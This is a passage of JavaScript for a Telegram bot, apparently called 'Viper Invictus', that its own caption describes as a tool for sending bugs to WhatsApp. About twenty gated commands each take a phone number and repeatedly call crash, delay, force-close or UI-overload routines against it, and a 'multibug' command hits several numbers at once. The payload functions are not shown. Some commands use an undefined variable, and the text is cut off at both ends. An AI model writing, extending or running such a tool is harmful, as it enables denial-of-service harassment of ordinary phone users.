    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /viperlayinvis 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /viperlayinvis
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 50; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await DelayInvisVnXNew(sock, target);      
      await sleep(1000);
    }
  })();
});
bot.command("unknown2", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /unknown2 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /unknown2
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 150; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await DelayInvisVnXNew(sock, target);      
      await sleep(3500);
    }
  })();
});
bot.command("xsticker", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /xsticker 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /xsticker
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 150; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await DelayStikerNullNew(sock, target);  
      await sleep(1500);
    }
  })();
});
bot.command("combodelay", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /combodelay 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /combodelay
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 150; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await DelayHardSwVnX(sock, target, mention = true);
      await DelayStikerNullNew(sock, target);   
      await sleep(1000);
    }
  })();
});
bot.command("unknown1", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }


  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /unknown1 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /unknown1
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 100; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await CrashInvisNewVnX(sock, target);  
      await sleep(1500);
    }
  })();
});
bot.command("xhot", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /xhot 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /xhot
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 150; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await KhasJawaForcloseInvisNew(target);
      await sleep(500);
    }
  })();
});
bot.command("xcalldell", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /xcalldell 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /xcalldell
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 150; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await ZhTForceDelete(sock, target);
      await sleep(2500);
    }
  })();
});
bot.command("casebug3", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /casebug3 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /casebug3
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 150; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await CrashWithStiker(sock, target);
      await sleep(1500);
    }
  })();
});
bot.command("xmetafc", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /xmetafc 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /xmetafc
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 150; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await CrashMetaNewVItc(sock, target);  
      await sleep(500);
    }
  })();
});
bot.command("viperlayfc", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /viperlayfc 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /viperlayfc
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 150; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await epcihDiley(sock, target);  
      await sleep(1000);
    }
  })();
});
bot.command("fcxprotocol", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /fcxprotocol 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /fcxprotocol
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 150; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await VnXCrashPronew(sock, target);  
      await sleep(1000);
    }
  })();
});
bot.command("xhoymsgxblank", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /xhoymsgxblank 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /xhoymsgxblank
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 250; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await VnXCrashPro(sock, target);  
      await sleep(1000);
      await VnXCrashProMax(sock, target);
      await sleep(1500);
      await VnXCrashProSuperMax(sock, target);
      await sleep(2000);
      await VnXCrashSuperMax(sock, target);
      await sleep(2500);
      await BlankGcSenn(target);
      await sleep(3000);
    }
  })();
});
bot.command("fcxlocainvis", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /fcxlocainvis 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /fcxlocainvis
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 150; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await CrashInvisNewVnX(sock, target);  
      await sleep(1500);
    }
  })();
});
bot.command("uihardsuper", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /uihardsuper 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /uihardsuper
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 250; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await SennUiOverload(target);  
      await sleep(3500);
    }
  })();
});
bot.command("uihard", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  if (!q) return ctx.reply(`Example: /uihard 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /uihard
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 100; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await SennUiOverload(target);  
      await sleep(1000);
    }
  })();
});
bot.command("unknown3", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  if (!q) return ctx.reply(`Example: /unknown3 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /unknown3
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 100; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await SennUiOverload(target);  
      await sleep(1500);
    }
  })();
});
bot.command("uimedium", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /uimedium 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /uimedium
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 50; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await SennUiOverload(target);  
      await sleep(1000);
    }
  })();
});
bot.command("uieasy", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

   

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  if (!q) return ctx.reply(`Example: /uieasy 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /uieasy
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 30; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await SennUiOverload(target);  
      await sleep(1000);
    }
  })();
});
bot.command("overloadsystem", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /overloadsystem 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /overloadsystem
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 150; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await SennUiOverload(target);  
      await sleep(1000);
    }
  })();
});
bot.command("multibug", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
    const text = ctx.message.text;
    const args = text.split(" ").slice(1).join(" ");    

    if (!args) {
      return ctx.reply(
        "❌ *Example*\n\n" +
        "📌 Do This:\n" +
        "`/multibug 628xxx, 491xxxx, 3737xxxx`"
      );
    }

    const numbers = args
      .split(",")
      .map(v => v.replace(/[^0-9]/g, ""))
      .filter(v => v.length > 5);

    if (numbers.length === 0) {
      return ctx.reply("❌ Tidak ada nomor valid yang bisa diproses.");
    }

    const targets = numbers.map(n => n + "@s.whatsapp.net");
    const totalTarget = targets.length;

    let progressMsg = await ctx.reply(
      "🚀 **MULTI BUG STARTED**\n\n" +
      `🎯 Total Target : ${totalTarget}\n` +
      `⏳ Status       : Initializing...\n` +
      `📊 Progress     : 0%`
    );

    for (let index = 0; index < targets.length; index++) {
      const target = targets[index];
      const current = index + 1;
      const percent = Math.floor((current / totalTarget) * 100);

      await ctx.telegram.editMessageText(
        ctx.chat.id,
        progressMsg.message_id,
        null,
        "⚡ *MULTI BUG IN PROGRESS*\n\n" +
        `🎯 Target        : ${target.replace("@s.whatsapp.net", "")}\n` +
